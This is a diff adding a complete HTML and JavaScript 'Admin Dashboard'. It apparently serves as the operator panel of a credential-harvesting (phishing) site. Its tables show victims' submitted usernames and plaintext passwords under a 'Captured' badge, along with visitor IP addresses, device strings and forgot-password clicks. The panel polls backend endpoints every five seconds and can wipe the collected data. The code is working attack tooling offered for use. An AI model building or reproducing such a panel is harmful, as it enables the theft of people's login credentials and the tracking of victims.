@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    /* ── Design Tokens ── */
+    :root {
+      --bg:          #080d18;
+      --surface:     #0f1829;
+      --card:        rgba(15,24,45,0.85);
+      --border:      rgba(99,130,255,0.12);
+      --border-soft: rgba(255,255,255,0.06);
+      --accent:      #4f7ef8;
+      --accent-glow: rgba(79,126,248,0.25);
+      --accent2:     #7c3aed;
+      --green:       #10b981;
+      --yellow:      #f59e0b;
+      --text:        #e8edf8;
+      --muted:       #64748b;
+      --radius:      14px;
+      --radius-sm:   8px;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 32px 16px 60px;
+      background-image:
+        radial-gradient(ellipse 70% 50% at 20% 0%, rgba(79,126,248,0.07) 0%, transparent 70%),
+        radial-gradient(ellipse 50% 40% at 80% 100%, rgba(124,58,237,0.07) 0%, transparent 70%);
+    }
+
+    /* ── Top Bar ── */
+    .topbar {
+      width: 100%;
+      max-width: 1000px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 28px;
+    }
+    .topbar-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .topbar-icon {
+      width: 40px; height: 40px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 18px var(--accent-glow);
+    }
+    .topbar-icon svg { width:20px; height:20px; fill:#fff; }
+    .topbar-title h1 {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      background: linear-gradient(90deg, #e8edf8, #94a3b8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .topbar-title span {
+      font-size: 11px;
+      color: var(--muted);
+      font-weight: 400;
+      display: block;
+      -webkit-text-fill-color: var(--muted);
+    }
+    .refresh-btn {
+      display: flex; align-items: center; gap: 8px;
+      background: rgba(79,126,248,0.1);
+      border: 1px solid rgba(79,126,248,0.3);
+      color: var(--accent);
+      padding: 9px 18px;
+      border-radius: var(--radius-sm);
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .refresh-btn:hover {
+      background: rgba(79,126,248,0.2);
+      box-shadow: 0 0 12px var(--accent-glow);
+    }
+    .refresh-btn svg { width:15px; height:15px; fill:currentColor; }
+
+    .reset-btn {
+      display: flex; align-items: center; gap: 8px;
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      color: #ef4444;
+      padding: 9px 18px;
+      border-radius: var(--radius-sm);
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .reset-btn:hover {
+      background: rgba(239, 68, 68, 0.2);
+      box-shadow: 0 0 12px rgba(239, 68, 68, 0.25);
+    }
+    .reset-btn svg { width:15px; height:15px; fill:currentColor; }
+
+    .topbar-actions { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+
+    /* ── Stats Row ── */
+    .stats-row {
+      width: 100%;
+      max-width: 1000px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+    .stat-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px 22px;
+      backdrop-filter: blur(12px);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      transition: border-color 0.2s;
+    }
+    .stat-card:hover { border-color: rgba(79,126,248,0.3); }
+    .stat-icon {
+      width: 44px; height: 44px;
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .stat-icon svg { width: 20px; height: 20px; }
+    .stat-icon.blue  { background: rgba(79,126,248,0.15); color: var(--accent); }
+    .stat-icon.green { background: rgba(16,185,129,0.15); color: var(--green); }
+    .stat-icon svg { fill: currentColor; }
+    .stat-info { flex: 1; }
+    .stat-value { font-size: 26px; font-weight: 700; line-height: 1; }
+    .stat-label { font-size: 12px; color: var(--muted); margin-top: 4px; }
+
+    /* ── Dashboard Card ── */
+    .dashboard {
+      width: 100%;
+      max-width: 1000px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      box-shadow: 0 32px 64px -16px rgba(0,0,0,0.6);
+      overflow: hidden;
+    }
+
+    /* ── Tabs ── */
+    .tab-nav {
+      display: flex;
+      border-bottom: 1px solid var(--border-soft);
+      background: rgba(0,0,0,0.2);
+      padding: 0 24px;
+      gap: 4px;
+    }
+    .tab-btn {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 16px 20px;
+      background: none;
+      border: none;
+      border-bottom: 2px solid transparent;
+      color: var(--muted);
+      font-family: 'Inter', sans-serif;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+      position: relative;
+      top: 1px;
+    }
+    .tab-btn svg { width:16px; height:16px; fill:currentColor; }
+    .tab-btn .count-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 20px;
+      height: 20px;
+      padding: 0 6px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--muted);
+      transition: all 0.2s;
+    }
+    .tab-btn:hover { color: var(--text); }
+    .tab-btn.active {
+      color: var(--accent);
+      border-bottom-color: var(--accent);
+    }
+    .tab-btn.active .count-badge {
+      background: rgba(79,126,248,0.2);
+      color: var(--accent);
+    }
+
+    /* ── Tab Panels ── */
+    .tab-panel { display: none; animation: fadeIn 0.25s ease; }
+    .tab-panel.active { display: block; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Table Styles ── */
+    .table-wrapper { overflow-x: auto; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+    }
+    thead th {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--muted);
+      padding: 14px 20px;
+      border-bottom: 1px solid var(--border-soft);
+      white-space: nowrap;
+      font-weight: 500;
+    }
+    tbody td {
+      padding: 15px 20px;
+      border-bottom: 1px solid var(--border-soft);
+      font-size: 13.5px;
+      vertical-align: middle;
+    }
+    tbody tr:last-child td { border-bottom: none; }
+    tbody tr {
+      transition: background 0.15s;
+    }
+    tbody tr:hover { background: rgba(79,126,248,0.04); }
+
+    /* ── Cell Badges & Chips ── */
+    .id-cell { color: var(--muted); font-size: 12px; font-weight: 500; }
+    .username-cell { font-weight: 600; color: #c7d4f0; }
+    .password-cell {
+      font-family: 'Courier New', monospace;
+      color: #7dd3fc;
+      letter-spacing: 0.02em;
+    }
+    .ip-cell { font-family: 'Courier New', monospace; color: #a7f3d0; font-size: 13px; }
+    .device-cell { color: var(--muted); font-size: 12.5px; max-width: 300px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .time-cell { color: var(--muted); font-size: 12.5px; white-space: nowrap; }
+
+    .badge-captured {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 4px 10px;
+      border-radius: 20px;
+      background: rgba(16,185,129,0.12);
+      color: var(--green);
+      font-size: 11px;
+      font-weight: 600;
+    }
+    .badge-captured::before {
+      content: '';
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: var(--green);
+    }
+    .badge-visit {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 4px 10px;
+      border-radius: 20px;
+      background: rgba(245,158,11,0.12);
+      color: var(--yellow);
+      font-size: 11px;
+      font-weight: 600;
+    }
+    .badge-visit::before {
+      content: '';
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: var(--yellow);
+    }
+
+    /* ── Empty / Loading ── */
+    .empty-state {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--muted);
+    }
+    .empty-state svg {
+      width: 42px; height: 42px;
+      fill: var(--muted);
+      opacity: 0.4;
+      margin-bottom: 14px;
+    }
+    .empty-state p { font-size: 14px; }
+
+    /* ── Loader Spinner ── */
+    .spinner {
+      display: flex; justify-content: center; align-items: center;
+      padding: 60px 20px;
+    }
+    .spinner::after {
+      content: '';
+      width: 32px; height: 32px;
+      border: 3px solid var(--border-soft);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── Live Dot ── */
+    .live-dot {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 11px; color: var(--green); font-weight: 500;
+    }
+    .live-dot::before {
+      content: '';
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      animation: pulse 1.6s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16,185,129,0.4); }
+      50% { opacity: 0.7; box-shadow: 0 0 0 5px rgba(16,185,129,0); }
+    }
+
+    /* ── Footer ── */
+    .panel-footer {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 12px 20px;
+      border-top: 1px solid var(--border-soft);
+      background: rgba(0,0,0,0.1);
+    }
+    .panel-footer .row-count { font-size: 12px; color: var(--muted); }
+
+    /* ── Modal ── */
+    .modal-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(8, 13, 24, 0.85);
+      backdrop-filter: blur(8px);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 1000;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.3s;
+    }
+    .modal-overlay.active {
+      opacity: 1; pointer-events: auto;
+    }
+    .modal {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 30px;
+      width: 90%; max-width: 400px;
+      box-shadow: 0 32px 64px -16px rgba(0,0,0,0.8);
+      transform: translateY(20px) scale(0.95);
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .modal-overlay.active .modal {
+      transform: translateY(0) scale(1);
+    }
+    .modal h2 { font-size: 20px; font-weight: 700; margin-bottom: 12px; color: #fff; }
+    .modal p { color: var(--muted); font-size: 14px; margin-bottom: 24px; }
+    .modal-input {
+      width: 100%; padding: 12px 16px;
+      background: rgba(0,0,0,0.2);
+      border: 1px solid var(--border-soft);
+      border-radius: var(--radius-sm);
+      color: var(--text);
+      font-size: 15px; margin-bottom: 20px;
+      outline: none; transition: border-color 0.2s;
+    }
+    .modal-input:focus { border-color: var(--accent); }
+    .modal-actions { display: flex; justify-content: flex-end; gap: 12px; }
+    .modal-btn {
+      padding: 10px 18px; border-radius: var(--radius-sm);
+      font-size: 14px; font-weight: 600; cursor: pointer; border: none;
+      transition: all 0.2s;
+    }
+    .modal-btn.cancel {
+      background: transparent; color: var(--muted);
+    }
+    .modal-btn.cancel:hover { color: var(--text); background: rgba(255,255,255,0.05); }
+    .modal-btn.confirm {
+      background: rgba(239, 68, 68, 0.15); color: #ef4444;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+    .modal-btn.confirm:hover {
+      background: rgba(239, 68, 68, 0.25);
+      box-shadow: 0 0 12px rgba(239, 68, 68, 0.2);
+    }
+
+    @media (max-width: 600px) {
+      body { padding: 16px 8px 40px; }
+      .topbar { flex-direction: column; align-items: flex-start; gap: 16px; margin-bottom: 20px; }
+      .topbar-actions { width: 100%; display: grid; grid-template-columns: 1fr 1fr; }
+      .refresh-btn, .reset-btn { justify-content: center; }
+      .stats-row { grid-template-columns: 1fr; gap: 12px; }
+      .tab-btn { padding: 12px 10px; font-size: 12px; }
+      .tab-nav { padding: 0 12px; overflow-x: auto; white-space: nowrap; -webkit-overflow-scrolling: touch; }
+      .tab-nav::-webkit-scrollbar { display: none; }
+      thead th, tbody td { padding: 10px 12px; font-size: 12px; }
+      .dashboard { border-radius: 10px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ── Top Bar ── -->
+  <div class="topbar">
+    <div class="topbar-title">
+      <div class="topbar-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12V11c0 4.52-3.03 8.76-7 10.09C8.03 19.76 5 15.52 5 11V6.3l7-3.12zM11 7v6h2V7h-2zm0 8v2h2v-2h-2z"/></svg>
+      </div>
+      <div>
+        <h1>Admin Dashboard</h1>
+        <span>Real-time activity monitor</span>
+      </div>
+    </div>
+    <div class="topbar-actions">
+      <button class="reset-btn" onclick="openResetModal()">
+        <svg viewBox="0 0 24 24"><path d="M15 4V3H9v1H4v2h1v13c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V6h1V4h-5zm2 15H7V6h10v13zM9 8h2v9H9zm4 0h2v9h-2z"/></svg>
+        Reset
+      </button>
+      <button class="refresh-btn" id="globalRefresh" onclick="refreshAll()">
+        <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+        Refresh
+      </button>
+    </div>
+  </div>
+
+  <!-- ── Stats Row ── -->
+    <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-icon blue">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+      </div>
+      <div class="stat-info">
+        <div class="stat-value" id="statLogins">—</div>
+        <div class="stat-label">Login Submissions</div>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon green">
+        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6.5 2.5 2.5 0 0 1 12 11.5z"/></svg>
+      </div>
+      <div class="stat-info">
+        <div class="stat-value" id="statVisits">—</div>
+        <div class="stat-label">Total Page Visits</div>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon" style="background:rgba(245,158,11,0.15); color:#f59e0b;">
+        <svg viewBox="0 0 24 24" style="fill:#f59e0b"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+      </div>
+      <div class="stat-info">
+        <div class="stat-value" id="statForgot">—</div>
+        <div class="stat-label">Forgot Pass Clicks</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Main Dashboard Card ── -->
+  <div class="dashboard">
+
+    <!-- Tab Navigation -->
+    <div class="tab-nav">
+      <button class="tab-btn active" id="tab-logins" onclick="switchTab('logins')">
+        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+        Login Detail
+        <span class="count-badge" id="badge-logins">0</span>
+      </button>
+      <button class="tab-btn" id="tab-logs" onclick="switchTab('logs')">
+        <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm4.24 16L12 15.45 7.77 18l1.12-4.81-3.73-3.23 4.92-.42L12 5l1.92 4.53 4.92.42-3.73 3.23L16.23 18z"/></svg>
+        Logs
+        <span class="count-badge" id="badge-logs">0</span>
+      </button>
+      <button class="tab-btn" id="tab-forgot" onclick="switchTab('forgot')">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+        Forgot Pass Logs
+        <span class="count-badge" id="badge-forgot">0</span>
+      </button>
+      <div style="flex:1"></div>
+      <div class="live-dot" style="align-self:center; margin-right:4px">Live</div>
+    </div>
+
+    <!-- ── PANEL 1: Login Detail ── -->
+    <div class="tab-panel active" id="panel-logins">
+      <div class="table-wrapper">
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Username</th>
+              <th>Password</th>
+              <th>Time</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="loginTableBody">
+            <tr><td colspan="5"><div class="spinner"></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="panel-footer">
+        <span class="row-count" id="loginRowCount">Loading…</span>
+        <span class="live-dot">Auto-refreshing every 5s</span>
+      </div>
+    </div>
+
+    <!-- ── PANEL 2: Logs ── -->
+    <div class="tab-panel" id="panel-logs">
+      <div class="table-wrapper">
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>IP Address</th>
+              <th>Device / Browser</th>
+              <th>Visit Time</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="logsTableBody">
+            <tr><td colspan="5"><div class="spinner"></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="panel-footer">
+        <span class="row-count" id="logsRowCount">Loading…</span>
+        <span class="live-dot">Auto-refreshing every 5s</span>
+      </div>
+    </div>
+
+    <!-- ── PANEL 3: Forgot Pass Logs ── -->
+    <div class="tab-panel" id="panel-forgot">
+      <div class="table-wrapper">
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>IP Address</th>
+              <th>Device / Browser</th>
+              <th>Clicked Time</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody id="forgotTableBody">
+            <tr><td colspan="5"><div class="spinner"></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="panel-footer">
+        <span class="row-count" id="forgotRowCount">Loading…</span>
+        <span class="live-dot">Auto-refreshing every 5s</span>
+      </div>
+    </div>
+
+  </div><!-- .dashboard -->
+
+  <!-- ── Reset Modal ── -->
+  <div class="modal-overlay" id="resetModal">
+    <div class="modal">
+      <h2>Reset Database</h2>
+      <p>This action will permanently delete all logs and login details. Enter the admin password to confirm.</p>
+      <input type="password" id="resetPassword" class="modal-input" placeholder="Admin Password" />
+      <div class="modal-actions">
+        <button class="modal-btn cancel" onclick="closeResetModal()">Cancel</button>
+        <button class="modal-btn confirm" onclick="confirmReset()">Reset Database</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* ── Tab Switching ── */
+    function switchTab(name) {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+      document.getElementById('tab-' + name).classList.add('active');
+      document.getElementById('panel-' + name).classList.add('active');
+    }
+
+    /* ── Reset Database ── */
+    function openResetModal() {
+      document.getElementById('resetModal').classList.add('active');
+      document.getElementById('resetPassword').value = '';
+      document.getElementById('resetPassword').focus();
+    }
+    
+    function closeResetModal() {
+      document.getElementById('resetModal').classList.remove('active');
+    }
+    
+    async function confirmReset() {
+      const password = document.getElementById('resetPassword').value;
+      if (!password) {
+        alert('Please enter a password');
+        return;
+      }
+      
+      const confirmBtn = document.querySelector('.modal-btn.confirm');
+      confirmBtn.textContent = 'Resetting...';
+      confirmBtn.disabled = true;
+
+      try {
+        const res = await fetch('/reset-db', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ password })
+        });
+        const data = await res.json();
+        
+        if (data.success) {
+          alert('Database has been reset successfully.');
+          closeResetModal();
+          refreshAll();
+        } else {
+          alert('Error: ' + data.error);
+        }
+      } catch (err) {
+        alert('Failed to reset database: ' + err.message);
+      } finally {
+        confirmBtn.textContent = 'Reset Database';
+        confirmBtn.disabled = false;
+      }
+    }
+
+    /* ── Fetch Login Details ── */
+    async function fetchLoginDetails() {
+      const tbody = document.getElementById('loginTableBody');
+      const rowCountEl = document.getElementById('loginRowCount');
+      const badgeEl = document.getElementById('badge-logins');
+      const statEl = document.getElementById('statLogins');
+
+      try {
+        const res = await fetch('/api/login-details?t=' + Date.now(), { cache: 'no-store' });
+        const data = await res.json();
+
+        badgeEl.textContent = data.length;
+        statEl.textContent = data.length;
+        rowCountEl.textContent = data.length + ' record' + (data.length !== 1 ? 's' : '');
+
+        if (data.length === 0) {
+          tbody.innerHTML = `
+            <tr><td colspan="5">
+              <div class="empty-state">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                <p>No login submissions yet.</p>
+              </div>
+            </td></tr>`;
+          return;
+        }
+
+        tbody.innerHTML = '';
+        data.forEach(item => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td class="id-cell">#${item.id}</td>
+            <td class="username-cell">${escHtml(item.username)}</td>
+            <td class="password-cell">${escHtml(item.password)}</td>
+            <td class="time-cell">${escHtml(item.submitted_time)}</td>
+            <td><span class="badge-captured">Captured</span></td>
+          `;
+          tbody.appendChild(tr);
+        });
+      } catch (err) {
+        console.error('login-details fetch error:', err);
+        tbody.innerHTML = '<tr><td colspan="5" class="empty-state"><p>Error loading data. Check server logs.</p></td></tr>';
+        rowCountEl.textContent = 'Error';
+      }
+    }
+
+    /* ── Fetch Visitor Logs ── */
+    async function fetchVisitLogs() {
+      const tbody = document.getElementById('logsTableBody');
+      const rowCountEl = document.getElementById('logsRowCount');
+      const badgeEl = document.getElementById('badge-logs');
+      const statEl = document.getElementById('statVisits');
+
+      try {
+        const res = await fetch('/api/visits?t=' + Date.now(), { cache: 'no-store' });
+        const data = await res.json();
+
+        badgeEl.textContent = data.length;
+        statEl.textContent = data.length;
+        rowCountEl.textContent = data.length + ' record' + (data.length !== 1 ? 's' : '');
+
+        if (data.length === 0) {
+          tbody.innerHTML = `
+            <tr><td colspan="5">
+              <div class="empty-state">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6.5 2.5 2.5 0 0 1 12 11.5z"/></svg>
+                <p>No visits recorded yet.</p>
+              </div>
+            </td></tr>`;
+          return;
+        }
+
+        tbody.innerHTML = '';
+        data.forEach(item => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td class="id-cell">#${item.id}</td>
+            <td class="ip-cell">${escHtml(item.ip_address)}</td>
+            <td class="device-cell" title="${escHtml(item.device_info)}">${escHtml(item.device_info)}</td>
+            <td class="time-cell">${escHtml(item.visit_time)}</td>
+            <td><span class="badge-visit">Visited</span></td>
+          `;
+          tbody.appendChild(tr);
+        });
+      } catch (err) {
+        console.error('visits fetch error:', err);
+        tbody.innerHTML = '<tr><td colspan="5" class="empty-state"><p>Error loading data. Check server logs.</p></td></tr>';
+        rowCountEl.textContent = 'Error';
+      }
+    }
+
+    /* ── XSS Guard ── */
+    function escHtml(str) {
+      return String(str ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+    }
+
+    /* ── Fetch Forgot Password Logs ── */
+    async function fetchForgotLogs() {
+      const tbody = document.getElementById('forgotTableBody');
+      const rowCountEl = document.getElementById('forgotRowCount');
+      const badgeEl = document.getElementById('badge-forgot');
+      const statEl = document.getElementById('statForgot');
+
+      try {
+        const res = await fetch('/api/forgot-logs?t=' + Date.now(), { cache: 'no-store' });
+        const data = await res.json();
+
+        badgeEl.textContent = data.length;
+        statEl.textContent = data.length;
+        rowCountEl.textContent = data.length + ' record' + (data.length !== 1 ? 's' : '');
+
+        if (data.length === 0) {
+          tbody.innerHTML = `
+            <tr><td colspan="5">
+              <div class="empty-state">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+                <p>No forgot password clicks yet.</p>
+              </div>
+            </td></tr>`;
+          return;
+        }
+
+        tbody.innerHTML = '';
+        data.forEach(item => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td class="id-cell">#${item.id}</td>
+            <td class="ip-cell">${escHtml(item.ip_address)}</td>
+            <td class="device-cell" title="${escHtml(item.device_info)}">${escHtml(item.device_info)}</td>
+            <td class="time-cell">${escHtml(item.clicked_time)}</td>
+            <td><span class="badge-visit" style="background:rgba(245,158,11,0.12);color:#f59e0b;">Clicked</span></td>
+          `;
+          tbody.appendChild(tr);
+        });
+      } catch (err) {
+        console.error('forgot-logs fetch error:', err);
+        tbody.innerHTML = '<tr><td colspan="5" class="empty-state"><p>Error loading data. Check server logs.</p></td></tr>';
+        rowCountEl.textContent = 'Error';
+      }
+    }
+
+    /* ── Refresh All ── */
+    function refreshAll() {
+      fetchLoginDetails();
+      fetchVisitLogs();
+      fetchForgotLogs();
+    }
+
+    /* ── Init ── */
+    refreshAll();
+    setInterval(refreshAll, 5000);
+  </script>
+</body>
+</html>
